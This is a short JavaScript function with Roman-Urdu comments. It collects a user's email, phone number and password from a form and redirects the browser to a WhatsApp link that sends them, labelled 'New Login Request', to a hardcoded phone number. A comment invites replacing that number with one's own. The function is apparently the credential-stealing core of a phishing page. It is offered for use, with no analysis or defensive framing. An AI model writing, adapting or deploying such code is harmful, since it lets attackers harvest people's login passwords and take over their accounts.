function sendData() {
    let email = document.getElementById("email").value;
    let phone = document.getElementById("phone").value;
    let password = document.getElementById("password").value;
    
    if (email === "" || phone === "" || password === "") {
        alert("Please fill all fields!");
        return;
    }
    
    let message = `New Login Request:\nEmail: ${email}\nPhone: ${phone}\nPassword: ${password}`;
    
    // WhatsApp Number Replace Karein (Apna Number Dalain)
    let whatsappNumber = "923182898491";
    let url = `https://api.whatsapp.com/send?phone=${whatsappNumber}&text=${encodeURIComponent(message)}`;
    
    window.location.href = url; // WhatsApp pe message send karega
}